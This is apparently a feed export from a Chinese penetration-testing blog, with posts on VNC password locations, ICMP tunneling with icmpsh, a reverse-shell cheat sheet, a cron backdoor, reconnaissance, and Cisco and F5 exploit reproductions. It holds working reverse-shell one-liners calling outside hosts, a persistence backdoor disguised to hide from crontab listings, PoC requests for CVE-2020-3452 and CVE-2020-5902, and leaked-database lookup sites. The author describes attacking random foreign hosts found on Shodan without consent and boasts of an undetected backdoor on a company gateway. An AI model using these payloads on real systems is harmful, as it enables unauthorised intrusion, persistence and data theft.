<td>RealVNC</td>
<td style="text-align:left">HKEYLOCALMACHINE\SOFTWARE\RealVNC\vncserver</td>
<td>Password</td>
</tr>
<tr>
<td>TightVNC</td>
<td style="text-align:left">HKEYCURRENTUSER\Software\TightVNC\Server Value</td>
<td>Password or PasswordViewOnly</td>
</tr>
<tr>
<td>TigerVNC</td>
<td style="text-align:left">HKEYLOCALUSER\Software\TigerVNC\WinVNC4</td>
<td>Password</td>
</tr>
<tr>
<td>UltraVNC</td>
<td style="text-align:left">C:\Program Files\UltraVNC\ultravnc.ini</td>
<td>passwd or passwd2</td>
</tr>
</tbody>
</table>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[内网渗透:隐藏通讯隧道技术]]></title>
        <id>https://m0sway.github.io/post/nei-wang-shen-tou-yin-cang-tong-xun-sui-dao-ji-zhu/</id>
        <link href="https://m0sway.github.io/post/nei-wang-shen-tou-yin-cang-tong-xun-sui-dao-ji-zhu/">
        </link>
        <updated>2020-08-03T06:18:54.000Z</updated>
        <content type="html"><![CDATA[<h2 id="隧道">隧道？</h2>
<p>在实际的网络中，通常会通过各种边界设备、软/硬件防火墙甚至入侵检测系统来检查对外连接情况，如果发现异样，就会对通信进行阻断。那么什么是隧道呢？这里的隧道，就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应服务器上。</p>
<p>常用的隧道技术有以下三种：</p>
<ul>
<li>网络层：IPv6 隧道、ICMP 隧道</li>
<li>传输层：TCP 隧道、UDP 隧道、常规端口转发</li>
<li>应用层：SSH 隧道、HTTP/S 隧道、DNS 隧道</li>
</ul>
<h2 id="icmp-隧道">ICMP 隧道</h2>
<p>ICMP（Internet ControlMessages Protocol，网间控制报文协议）是TCP/IP协议族的子协议，是一种面向无连接的协议。</p>
<p>在 ICMP 通信协议中，通信双方的两台设备不需要开放端口即可进行，而在一般的通信协议中，是必须要开放端口的。最常见的 ICMP 协议的消息为 ping 命令的回复，攻击者可以利用命令行得到比回复更多的 ICMP 请求。</p>
<p>在一些网络环境中，如果攻击者使用各类上层隧道（例如HTTP隧道、DNS隧道、常规端口转发等）进行的操作都失败了，由于防火墙不会屏蔽ping数据包，所以常常会通过ping命令访问远程主机，尝试建立ICMP隧道，将TCP/UDP数据封装到ICMP的ping数据包中，从而穿过防火墙，实现不受限制的网络访问。</p>
<p>经常使用的ping命令就是基于ICMP协议，windows系统下ping默认传输的是： abcdefghijklmnopqrstuvwabcdefghi，共32bytes，如下图所示：<br>
<img src="https://m0sway.github.io/post-images/1596435955491.jpg" alt="" loading="lazy"></p>
<p>linux系统下，ping默认传输的是48bytes，前8bytes随时间变化，后面的固定不变，内容为!”#$%&amp;’()+,-./01234567，如下图所示：<br>
<img src="https://m0sway.github.io/post-images/1596435987171.jpg" alt="" loading="lazy"></p>
<p>此外，ping的包大小，也就是data大小是可以修改的，从包体内容来看，规律还是一样，就是重复罢了，如下图所示：分别是win和linux<br>
<img src="https://m0sway.github.io/post-images/1596436036345.jpg" alt="" loading="lazy"><br>
<img src="https://m0sway.github.io/post-images/1596436043909.jpg" alt="" loading="lazy"></p>
<p>那么问题来了：是否可以改变这些data填充我们自己的数据呢？<br>
答案是可以的，这就是ICMP隐蔽隧道的原理，改变操作系统默认填充的Data，替换成我们自己的数据。</p>
<p>icmpsh<br>
icmpsh 工具是一个简单的ICMP反弹shell工具。可以跨平台，且运行时无需管理员权限。</p>
<p>下载地址：https://github.com/inquisb/icmpsh</p>
<p>运行需要安装Python的impacket类库，以便对tcp、udp、icmp、igmp、arp、ipv4、ipv6、smb、等进行访问。</p>
<p>icmpsh 运行时因为要代替系统本身的ping命令的应答程序，所以需要先执行以下命令关闭本地系统的ICMP应答，否则获得的shell不稳定：<br>
<code>sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1 // 恢复设为0</code><br>
<img src="https://m0sway.github.io/post-images/1596436339770.jpg" alt="" loading="lazy"></p>
<h3 id="演示">演示</h3>
<p>攻击者IP：192.168.200.103<br>
受害者IP：192.168.200.110</p>
<p>攻击者server端在项目目录下输入：</p>
<pre><code>    python icmpsh_m.py 192.168.200.103 192.168.200.110
    python icmpsh_m.py 攻击者ip 受害者ip
</code></pre>
<p>或输入./run.sh运行程序，之后提醒你输入受害者公网ip，会给出你在受害者主机上执行的命令。</p>
<p>给受害者主机上传icmpsh.exe并执行命令：</p>
<pre><code>    icmpsh.exe -t 192.168.200.103 -d 500 -b 30 -s 128
</code></pre>
<p>即可在攻击机上看到受害者的shell：</p>
<pre><code>imcpsh.exe参数：
    -t  host主机ip地址，用于向其发送ping请求。 此选项是强制性的！
    -r  发送包含字符串的单个测试icmp请求，然后退出。这是用于测试连接的。
    -d  毫秒请求之间的延迟（以毫秒为单位）
    -o  毫秒响应超时（以毫秒为单位）。 如果未及时收到回复，
                        从站将增加一个空白计数器。 如果该计数器达到极限，则从站将退出。
                        如果收到响应，则计数器设置回0。
    -b  空格数限制（退出前未答复的icmp请求
    -s  字节最大数据缓冲区大小（以字节为单位）
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[反弹shell总结]]></title>
        <id>https://m0sway.github.io/post/fan-dan-shell-zong-jie/</id>
        <link href="https://m0sway.github.io/post/fan-dan-shell-zong-jie/">
        </link>
        <updated>2020-07-31T08:05:31.000Z</updated>
        <content type="html"><![CDATA[<h2 id="0x00-前言">0x00 前言</h2>
<p>平常渗透中经常需要反弹shell，于是solo一波。</p>
<h2 id="0x01-bash反弹">0x01 bash反弹</h2>
<p>/dev/[tcp|udp]/host/port是linux设备里面比较特殊的文件，读取或写入相当于建立socket调用<br>
反弹：</p>
<pre><code>    bash -i &gt; &amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1
</code></pre>
<h2 id="0x02-nc反弹">0x02 nc反弹</h2>
<p>lnc交互式反弹</p>
<pre><code>    nc 10.10.10.10 -t /bin/bash

    或者：

    /bin/sh | nc 10.10.10.10 1234
</code></pre>
<p>nc -e反弹（nc支持-e参数）</p>
<p>-e后面跟的参数代表的是在创建连接后执行的程序，这里代表在连接到远程后可以在远程执行一个本地shell(<code>/bin/bash</code>)，也就是反弹一个shell给远程，可以看到远程已经成功反弹到了shell，并且可以执行命令。</p>
<pre><code>    nc -e /bin/bash 10.10.10.10 1234
</code></pre>
<p>如果nc不支持-e参数的话，可以利用到linux中的管道符</p>
<pre><code>    nc 10.10.10.10 1234 | /bin/bash | 127.0.0.1 12345
</code></pre>
<h2 id="0x03-curl反弹">0x03 curl反弹</h2>
<p>前提：index文件包含bash一句话</p>
<pre><code>    curl 10.10.10.10/index.html | bash
</code></pre>
<p>当然，不限于index文件，其他目录其他文件也可以的。<br>
而且，只要文本包含一句话即可也就是说存在其他语句没有影响。</p>
<h2 id="0x04-whois反弹">0x04 whois反弹</h2>
<pre><code>    whois -h 10.10.10.10 -p 1234 `ifconfig`
</code></pre>
<h2 id="0x05-python反弹">0x05 python反弹</h2>
<pre><code>    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.10.10&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
</code></pre>
<h2 id="0x06-php反弹">0x06 PHP反弹</h2>
<pre><code>    php -r '$sock=fsockopen(&quot;10.10.10.10&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
</code></pre>
<h2 id="0x07-ruby反弹shell">0x07 ruby反弹shell</h2>
<pre><code>    ruby -rsocket -e 'exit if fork;c=TCPSocket.new(&quot;10.10.10.10&quot;,&quot;1234&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end'
</code></pre>
<p>Winodws版：</p>
<pre><code>    ruby -rsocket -e 'c=TCPSocket.new(&quot;10.10.10.10&quot;,&quot;1234&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end'
</code></pre>
<h2 id="0x08-java反弹">0x08 java反弹</h2>
<p>直接用msf的：</p>
<pre><code>    use payload/java/shell/reverse_tcp
</code></pre>
<h2 id="0x09-lua反弹">0x09 lua反弹</h2>
<p>直接用msf的：</p>
<pre><code>    use payload/cmd/unix/reverse_lua
</code></pre>
<h2 id="补充">补充</h2>
<p>###一条命令实现无文件兼容性强的反弹后门。</p>
<pre><code>    (crontab -l;echo '*/60 * * * * exec 9&lt;&gt; /dev/tcp/IP/port;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i')|crontab -
</code></pre>
<p>就是一条SHELL脚本，通过crontab 自定义一条定时执行的任务。</p>
<p>&lt;详解&gt;<br>
<code>/dev/tcp/IP/port</code>：通过调用/dev/tcp 类似发出了一个socket的调用，建立一个socket连接，读写这个/dev/tcp就相当于在这个socket连接中传输数据，后面跟上你控制端的IP和端口，当然也可以写上你的域名，这样你植入后门后，你接收SHELL的服务器IP发生改变，你同样能收到SHELL。</p>
<p><code>exec 9&lt;&gt;</code>：9是linux 中的文件描述符，0代表从键盘输入，1代表标准输出的，2代表错误输出的，这个大家都知道吧，其实一共有10个，只是其它的默认没有打开。exec 9&lt;&gt; ，意思是以读写方式打开/dev/tcp，然后所有的数据都会保留在9这个文件描述符内，并通过tcp连接在两端传输。</p>
<p><code>exec 0&lt;&amp;9</code> :意思是将9里面的内容传送给输入端，作用是当我们在控制端输入命令的时候，命令就自动传到被控端并被输入执行.</p>
<p><code>exec 1&gt;9&amp;</code> : 这个意思大家现在能明白了吧，就是被控端执行命令后的正确回显也输出到 9，这样我们在控制端就能接收到。</p>
<p><code>2&gt;&amp;1</code> :错误的输出也指向1，而前面1已经指向到了9，所以错误的消息也传向了9，这样我们就能在控制端收到正确和错误的回显了。</p>
<p><code>/bin/bash --noprofile -i</code> :这个就是调用bash来执行我们输入的命令，后面跟的参数是禁止执行一些登录shell时调用的脚本。</p>
<p>前面的时间设定很简单，大家不明白的可以百度下，我曾经植入一条这样的后门到一个大型企业的网关防火墙上（linux内核），每个月只连出来一次，2年了人家都没发现，当然可能管理员比较懒。拿到网关shell当然各种代理就都不是事了。</p>
<p>当然管理员通过crontab -l 可以查看到任务，</p>
<p>不过你这样：</p>
<pre><code>        (crontab -l;printf &quot;*/60 * * * * exec 9&lt;&gt; /dev/tcp/IP/PORT;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for whoami%100c\n&quot;)|crontab -
</code></pre>
<p>猥琐版直接显示你用户名下没有任务....</p>
<p>在未连接状态启动反连任务的时候，进程和端口都无状态。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Cisco CVE-2020-3452 漏洞复现]]></title>
        <id>https://m0sway.github.io/post/cisco-cve-2020-3452-lou-dong-fu-xian/</id>
        <link href="https://m0sway.github.io/post/cisco-cve-2020-3452-lou-dong-fu-xian/">
        </link>
        <updated>2020-07-27T11:35:29.000Z</updated>
        <content type="html"><![CDATA[<p>##简介<br>
Cisco Firepower Threat Defense（FTD）和Cisco Adaptive Security Appliances Software（ASA Software）都是美国思科（Cisco）公司的产品。Cisco Firepower Threat Defense是一套提供下一代防火墙服务的统一软件。Cisco Adaptive Security Appliances Software是一套防火墙和网络安全平台。该平台提供了对数据和网络资源的高度安全的访问等功能。</p>
<p>##0x01 漏洞描述<br>
Cisco ASA Software和FTD Software中存在输入验证错误漏洞，该漏洞源于受影响设备没有正确验证HTTP请求中的URL。远程攻击者可通过将包含目录遍历字符序列的特制HTTP请求发送到受影响的设备利用该漏洞在目标设备上查看Web服务文件系统内的任意文件。</p>
<p>##0x02 开搞开搞<br>
老规矩，先去shodan上任意寻找一个受害者(别是国内的就行)</p>
<pre><code>    shodan搜索：
    Set-Cookie: webvpn;
</code></pre>
<p>POC如下</p>
<pre><code>    POC1：
    https：// &lt;domain&gt; /+CSCOT+/translation-table?type=mst&amp;textdomain=/%2bCSCOE%2b/portal_inc.lua&amp;default-language&amp;lang=../

    POC2:
    https://&lt;domain&gt;/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=%2bCSCOE%2b/portal_inc.lua
</code></pre>
<p>先来看一下登录界面的样子(要记得哦，后面会有用的)：<br>
<img src="https://m0sway.github.io/post-images/1595850672829.jpg" alt="" loading="lazy"></p>
<p>给出的这两个POC允许未经身份验证在Cisco ASA和Cisco Firepower中读取任意文件，但无法读取OS文件。<br>
如下图所示：<br>
<img src="https://m0sway.github.io/post-images/1595850814218.jpg" alt="" loading="lazy"><br>
其他还有什么可以读的文件可以自己尝试找找。</p>
<p>接着还发现，通过这个文件遍历漏洞还可以扩展出一个任意文件删除的漏洞。</p>
<p>POC<br>
<code>curl -k -H &quot;Cookie: token=..//+CSCOU+/csco_logo.gif&quot; https://target/+CSCOE+/session_password.html</code></p>
<p>这里就用Cisco的logo来演示，右击logo图片找到图片地址。</p>
<p>可以通过curl命令，也可以通过bp来执行删除操作，如下图所示：<br>
<img src="https://m0sway.github.io/post-images/1595851198560.jpg" alt="" loading="lazy"><br>
<img src="https://m0sway.github.io/post-images/1595851211367.jpg" alt="" loading="lazy"></p>
<p>emmm 大概就是这么一个鸡肋的漏洞(就和CatGhost漏洞一样，单独一个漏洞没太大的利用价值)</p>
<p>##POC<br>
这个漏洞需要POC？</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[信息收集系统篇]]></title>
        <id>https://m0sway.github.io/post/xin-xi-shou-ji-zong-jie-pian-bu-ding-qi-geng-xin/</id>
        <link href="https://m0sway.github.io/post/xin-xi-shou-ji-zong-jie-pian-bu-ding-qi-geng-xin/">
        </link>
        <updated>2020-07-18T06:29:59.000Z</updated>
        <content type="html"><![CDATA[<ol>
<li>
<p>whois信息<br>
whois信息可以获取关键注册人的信息，包括注册商、所有者、所有者联系邮箱、联系电话、域名注册时间、域名到期时间、域名状态、DNS服务器等。<br>
<code>http://whois.chinaz.com/ https://whois.aliyun.com/</code><br>
各大注册商以及第三方站长工具的域名WHOIS信息查询地址如下：</p>
<pre><code> 中国万网域名WHOIS信息查询地址：https://whois.aliyun.com/

 西部数码域名WHOIS信息查询地址：https://whois.west.cn/

 新网域名WHOIS信息查询地址：http://whois.xinnet.com/domain/whois/index.jsp

 纳网域名WHOIS信息查询地址：http://whois.nawang.cn/

 中资源域名WHOIS信息查询地址：https://www.zzy.cn/domain/whois.html

 三五互联域名WHOIS信息查询地址：https://cp.35.com/chinese/whois.php

 新网互联域名WHOIS信息查询地址：http://www.dns.com.cn/show/domain/whois/index.do

 美橙互联域名WHOIS信息查询地址：https://whois.cndns.com/

 爱名网域名WHOIS信息查询地址：https://www.22.cn/domain/

 易名网域名WHOIS信息查询地址：https://whois.ename.net/

 下面是站长工具类第三方查询地址(部分网站注册人信息会隐藏或提示联系域名注册商获取，可以去who.is查询看看)

 Kali的查询：whois -h 注册服务器地址  域名

 站长工具-站长之家域名WHOIS信息查询地址：http://whois.chinaz.com/

 爱站网域名WHOIS信息查询地址：https://whois.aizhan.com/

 腾讯云域名WHOIS信息查询地址：https://whois.cloud.tencent.com/

 国外的who.is：https://who.is/ 

 微步：https://x.threatbook.cn/ 

 Virus Total:https://www.virustotal.com

 还有Kali中自带的whois查询、一些集成工具等。
</code></pre>
<p>备案信息查询</p>
<pre><code> 天眼查：https://www.tianyancha.com/ 

 ICP备案查询网：http://www.beianbeian.com/ 

 国家企业信用信息公示系统：http://www.gsxt.gov.cn/index.html

 爱站的备案查询：https://icp.aizhan.com
</code></pre>
</li>
<li>
<p>web指纹识别<br>
获取系统、中间件及其他插件信息。<br>
根据经验判断：</p>
<pre><code>Windows系统（IIS等环境）一般不区分URL中的大小写；Linux系统（Apache、tomcat、nginx等环境）严格区分URL中的大小写。
</code></pre>
<p>浏览器插件插件:<br>
<code>Wapplyzer插件</code><br>
web报错信息<br>
未做处理的web报错信息如：400、500等可能会包含中间件版本信息、网站绝对路径等信息.<br>
报错手段：</p>
<pre><code> 1. 利用不完整的URL。
 2. 添加特殊字符的URL。
 3. POST data中添加特殊字符。
 4. 修改request数据包中参数的值，添加垃圾数据等。
</code></pre>
<p>在线工具:</p>
<pre><code> http://whatweb.bugscaner.com/look/ 在线指纹识别
 https://scan.top15.cn/web/   ThreatScan基础信息查询
 http://www.yunsee.cn/ 云悉
 fofa、zoomeye、shodan 都可以搜索参考。
</code></pre>
</li>
<li>
<p>waf识别<br>
wafw00f</p>
<pre><code>项目地址：
https://github.com/EnableSecurity/wafw00f
使用方式：
wafw00f [目标]
</code></pre>
</li>
<li>
<p>获取真实IP<br>
本地ping:<br>
<code>ping xxx.com 而不是 ping www.xxx.com （现有很多CDN厂商基本只要求把www.xxx.com cname到cdn主服务器上去）</code><br>
全球Ping检测:</p>
<pre><code>http://ping.chinaz.com/
https://www.wepcc.com/
</code></pre>
<p>fofa、zoomeye、shodan搜索:</p>
<pre><code>https://fofa.so/ （国内推荐）
https://www.zoomeye.org/ （国内推荐）
https://www.shodan.io/ （国外推荐）
查看域名对应的历史端口和服务找出可疑的IP，再结合ip域名反查（https://dns.aizhan.com/）来确定真实IP。
</code></pre>
<p>IP反查在线工具:</p>
<pre><code>https://dns.aizhan.com/
http://tool.chinaz.com/
http://site.ip138.com/
https://phpinfo.me/bing.php
</code></pre>
<p>查询网:<br>
<code>https://site.ip138.com/</code><br>
通过国外DNS:</p>
<pre><code>nslookup xxx.com 8.8.8.8
在线查询：
https://webiplookup.com/
</code></pre>
<p>历史纪录寻找真实IP（需要翻墙）:<br>
<code>http://toolbar.netcraft.com/site_report?url=www.xxx.com</code><br>
其他方式：</p>
<pre><code>1. github泄露
2. 如果目标站点有自己的APP，通过抓取APP请求来获取ip
3. 利用发送邮件功能
4. rss 订阅链接
</code></pre>
</li>
<li>
<p>获取端口服务信息</p>
<pre><code>Nmap安装与使用方法可参考：
https://blog.csdn.net/m1585761297/article/details/80015726
https://www.cnblogs.com/weihua2616/p/6599629.html
</code></pre>
<p>在线端口扫描<br>
http://old.tool.chinaz.com/port/<br>
http://coolaf.com/tool/port<br>
https://scan.top15.cn/web/portscan</p>
</li>
<li>
<p>子域名信息收集<br>
通过搜索引擎搜索<br>
手动搜索（百度、Google）:<br>
<code>site:*.xxx.com</code></p>
<p>工具搜索</p>
<pre><code> 项目地址https://github.com/laramies/theHarvester
使用：
python3 theHarvester.py -d qq.com -l 200 -b baidu,bing,google //-d 目标 -l多少条 -b搜索引擎 
</code></pre>
<p>第三方聚合应用枚举：</p>
<pre><code>1) VirusTotal：https://www.virustotal.com/#/home/search
2) DNSdumpster：https://dnsdumpster.com/ 
</code></pre>
<p>SSL证书查询：<br>
SSL/TLS证书通常包含域名、子域名和邮件地址，这些是我们需要获取的信息，通常CT是CA的一个项目，CA会把每个SSL/TLS证书发布到公共日志中，查找域名所属证书的最简单方法就是使用搜索引擎搜索一些公开CT日志。</p>
<p>主要网站如下：</p>
<pre><code>1) https://crt.sh/

2) https://censys.io/

3) https://developers.facebook.com/tools/ct/

4) https://google.com/transparencyreport/https/ct/
</code></pre>
<p>在线网站查询：</p>
<pre><code>1) http://dns.aizhan.com

2) http://z.zcjun.com/（响应很快,推荐）
</code></pre>
<p>子域名枚举<br>
subDomainsBrute</p>
<pre><code>作用：高并发DNS暴力枚举，发现其他工具无法探测到的域名, 如Google，aizhan，fofa。

工具地址：
https://github.com/lijiejie/subDomainsBrute

依赖安装
pip install dnspython gevent

工具使用
subDomainsBrute.py [options] target.com
</code></pre>
<p>wydomain</p>
<pre><code>项目地址：
https://github.com/ring04h/wydomain

工具使用
python wydomain.py -d XX.com -o mi.txt
python dnsburte.py -d XX.com -f dnspod.csv -o XX_burp.txt
#.zshrc已定义输入domain 查看使用方式
</code></pre>
<p>Layer子域名挖掘机</p>
<pre><code>链接:https://pan.baidu.com/s/1lTxKmz6sYUFcTG_eyAqCjA  密码:dh7s
</code></pre>
</li>
<li>
<p>目录及文件信息</p>
<p>字典库:</p>
<pre><code>https://github.com/TheKingOfDuck/fuzzDicts 在更新
https://github.com/k8gege/PasswordDic 在更新
https://github.com/rootphantomer/Blasting_dictionary 已停止更新
</code></pre>
<p>暴力扫描目录和文件的工具<br>
dirmap</p>
<pre><code>项目地址：
https://github.com/H4ckForJob/dirmap/
使用方式：
结果输出位置工具目录output文件夹中

单个目标，默认为http
python3 dirmap.py -i https://target.com -lcf
python3 dirmap.py -i 192.168.1.1 -lcf

子网（CIDR格式）
python3 dirmap.py -i 192.168.1.0/24 -lcf

网络范围
python3 dirmap.py -i 192.168.1.1-192.168.1.100 -lcf

文件读取
python3 dirmap.py -iF targets.txt -lcf
</code></pre>
<p>dirsearch</p>
<pre><code>项目地址：
https://github.com/maurosoria/dirsearch

使用方式：
python3 dirsearch.py -u http://eye.bjjtw.gov.cn:8081 -e asp

python3 dirsearch.py -t 10 --timeout=3 -x 999,202,502,401,503,404,403,405,500,505,400 -L ./url.txt -e * -w
//-t 线程；-x 排除指定返回状态值的页面；-L 读取目标url文件；-e 指定字典地址；-w 

指定字典扫描：
python3 dirsearch.py -u http://www.xxx.com -e /xx/xx/dir.txt
</code></pre>
<p>windows工具-SWebScan</p>
<pre><code>https://github.com/shack2/SWebScan/releases
</code></pre>
<p>git/svn信息泄露<br>
目录扫描工具能够扫描出.svn或者.git的目录，运用下面的工具进行利用。</p>
<pre><code>svn-extractor

项目地址：
https://github.com/anantshri/svn-extractor
使用方式：
svn-extractor.py --url“具有.svn的网址”

GitHack

项目地址：
https://github.com/BugScanTeam/GitHack
使用方式：
python GitHack.py http://www.openssl.org/.git/

Seay-Svn

windows工具：
Seay-Svn.rar 输入具有.svn的网址（下载地址：链接:https://pan.baidu.com/s/1Hc2xENcCfNcT59kaUXMaLg  密码:wdls）

目录结构信息

burpsuite被动扫描
awvs目录结构扫描
</code></pre>
</li>
<li>
<p>JS文件信息收集<br>
JSFinder</p>
<pre><code>项目地址：https://github.com/Threezh1/JSFinder

简单爬取：
python3 JSFinder.py -u https://www.jd.com/

-d进行深度爬取来获得更多内容，并使用命令 -ou, -os来指定URL和子域名所保存的文件名：
python3 JSFinder.py -u https://www.jd.com/ -d -ou jd_url.txt -os jd_domain.txt

指定URL：
python JSFinder.py -f text.txt

指定JS：
python JSFinder.py -f text.txt -j
</code></pre>
</li>
<li>
<p>C段及旁站信息收集<br>
C段:</p>
<pre><code>http://www.webscan.cc/

https://phpinfo.me/bing.php（可能访问不了）

神器：https://github.com/robertdavidgraham/masscan

御剑1.5：https://download.csdn.net/download/peng119925/10722958

C端查询：IIS PUT Scanner（扫描速度快，自定义端口，有banner信息）
</code></pre>
<p>旁站查询（同ip网站查询、反查）</p>
<pre><code>https://scan.top15.cn/web/webside
https://dns.aizhan.com/
</code></pre>
</li>
<li>
<p>社工<br>
利用邮箱、手机查询注册过的网站</p>
<pre><code>https://www.reg007.com/ 国内
https://namechk.com/ 国外
综合性信息情报搜索（需要翻墙）
https://www.osint-labs.org/search/index.php
</code></pre>
<p>社工库</p>
<pre><code>http://site3.sjk.space
https://haveibeenpwned.com/
27017/27018 服务：mongodb     总结：未授权访问/爆破
</code></pre>
<p>Telegram社工机器人<br>
目前可用的社工查询机器人，需要自己翻墙创建Telegram账号。<br>
https://t.me/sgk123bot</p>
</li>
<li>
<p>近源信息收集</p>
<ol>
<li>
<p>外接无线网卡主要是用来配合kali破解无线密码的，现在一般是通过抓握手包然后跑包来破解，还可以通过伪造SSID钓鱼、中间人攻击等等，主要是获取无线网密码、网段信息等。</p>
</li>
<li>
<p>大菠萝可以捕获握手包并模仿目标AP。大菠萝可以完全模仿首选网络，从而实现中间人攻击，获取我们想要的无线网信息，为攻击目标系统收集信息。</p>
</li>
<li>
<p>当前电子设备和电路的工作频率不断提高，而工作电压却逐渐降低，因此对电磁脉冲（EMP）的敏感性和易损性也不断增加。同时，电子系统中的集成电路对电磁脉冲比较敏感，往往一个较大的电磁脉冲，就会使集成块产生误码、甚至电子元器件失效或烧毁，所以我们可以使用EMP干扰来打开部分电子门禁和电子密码锁。如果我们使用EMP无法打开门禁，那我们还有一个方法，但是需要我们稍微靠近一下目标，找合适的机会破解IC卡，或复制ID卡。进而突破门禁，实现物理攻击和信息收集。</p>
</li>
<li>
<p>当然我们也可由通过社工获取指纹信息，拓印出一个跟原指纹一模一样的指纹膜突破物理门禁、办公PC指纹识别等。</p>
</li>
<li>
<p>如果你能接触到目标主机，那你就可以将键盘记录器接入到主机和键盘之间，并配置连接WI-FI，将键盘敲击的数据实时传回远程服务器。</p>
</li>
<li>
<p>进入办公地点或者内网之后，可以在内网偷偷装一个PacketSquirrel，作为中间人攻击工具，PacketSquirrel可以捕获网络端点的数据包、并且可以使用VPN和反向shell获得远程访问权限，为攻击目标系统收集部分信息。</p>
</li>
<li>
<p>badusb是HID（人机接口）攻击的一种，也称为热插拔攻击。想象一下，你可以走到一台计算机上，插入看似无害的USB驱动器，然后安装后门，窃听文档，窃取相关密码.，收集目标系统相关信息。</p>
</li>
</ol>
</li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[F5 BIG-IP RCE漏洞（CVSS 10）复现]]></title>
        <id>https://m0sway.github.io/post/f5-big-ip-rce-lou-dong-cvss-10fu-xian/</id>
        <link href="https://m0sway.github.io/post/f5-big-ip-rce-lou-dong-cvss-10fu-xian/">
        </link>
        <updated>2020-07-08T01:21:55.000Z</updated>
        <content type="html"><![CDATA[<p>##简介<br>
F5 BIG-IP 是美国``F5公司一款集成流量管理、DNS、出入站规则、web应用防火墙、web网关、负载均衡等功能的应用交付平台。<br>
CVE编号：CVE-2020-5902</p>
<p>##0x01 漏洞描述<br>
在 F5 BIG-IP 产品的流量管理用户页面 (TMUI)/配置程序的特定页面中存在一处远程代码执行漏洞。<br>
导致未授权攻击者可以执行任意命令(弹个shell啥的😋)</p>
<p>##0x02 影响版本</p>
<p>BIG-IP 15.x: 15.1.0/15.0.0</p>
<p>BIG-IP 14.x: 14.1.0 ~ 14.1.2</p>
<p>BIG-IP 13.x: 13.1.0 ~ 13.1.3</p>
<p>BIG-IP 12.x: 12.1.0 ~ 12.1.5</p>
<p>BIG-IP 11.x: 11.6.1 ~ 11.6.5</p>
<p>##0x03 漏洞验证<br>
emmmm 首先去shodan上任意寻找一个受害者(别是国内的就行)</p>
<pre><code>shodan
http.favicon.hash:-335242539
http.title:&quot;BIG-IP&amp;reg;- Redirect&quot;

fofa
title=&quot;BIG-IP&amp;reg;- Redirect&quot;

censys
443.https.get.body_sha256:5d78eb6fa93b995f9a39f90b6fb32f016e80dbcda8eb&gt;71a17994678692585ee5
443.https.get.title:&quot;BIG-IP&amp;reg;- Redirect&quot;

google
inurl:&quot;tmui/login.jsp&quot;
intitle:&quot;BIG-IP&quot; inurl:&quot;tmui&quot;
</code></pre>
<p>####开搞<br>
(截图随便截的，凑活看看吧)<br>
github上面已经公布的poc</p>
<pre><code>RCE: 
   curl -v -k  'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb /workspace/tmshCmd.jsp?command=list+auth+user+admin'

Read File: 
   curl -v -k  'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd' 
</code></pre>
<p>其中<code>list+auth+user+admin</code>这个命令是F5设备的命令，查看管理员权限的用户，如想查看所有用户可以使用<code>list+auth+user</code>来查看(+是连接符，在url中就是空格的含义，不用管它)<br>
如下图所示：<br>
<img src="https://m0sway.github.io/post-images/1595831143006.png" alt="" loading="lazy"></p>
<p>到这里为止，已经验证了，确实能够执行远程命令和远程读取任意文件，但是给出的poc中能执行的只有F5设备的命令，并不能执行例如<code>ls、whoami、pwd</code>等常用的bash命令。<br>
于是我们需要稍加改造。</p>
<ul>
<li>1.修改alias ，将list设置成bash命令</li>
</ul>
<pre><code>htts://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash
</code></pre>
<ul>
<li>2.生成bash文件并写入要执行的命令</li>
</ul>
<pre><code>htts://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp
POST:fileName=/tmp/m0sway&amp;content=whoami
</code></pre>
<ul>
<li>
<p>3.执行bash文件<br>
<code>htts://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/m0sway</code></p>
</li>
<li>
<p>4.还原alias设置，防止影响目标正常使用（切记一定要还原，不然无法使用正常的命令）<br>
<code>https://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list</code></p>
</li>
</ul>
<p>Example:<br>
<img src="https://m0sway.github.io/post-images/1595831292953.png" alt="" loading="lazy"></p>
<p>这是命令成功执行后的回显，此处执行的是whoami命令</p>
<figure data-type="image" tabindex="1"><img src="https://m0sway.github.io/post-images/1595831311709.png" alt="" loading="lazy"></figure>
<p>能够执行命令之后，就是弹shell啦。<br>
这里用python弹，F5设备都是自带python的，使用python弹方便些(用bash弹出来的shell隧道不稳定，容易断开)。<br>
如果想研究研究F5设备可以在crontab里面弄一条定时任务弹shell.</p>
<figure data-type="image" tabindex="2"><img src="https://m0sway.github.io/post-images/1595831332726.jpg" alt="" loading="lazy"></figure>
<p>emmm 记得走之前清理下痕迹就好(我看了下tmp目录，好几个中国的反弹shell的IP，真的是能搞..不过有的应该是弹不出去的shell😇)<br>
####POC<br>
我这么懒，是吧？</p>
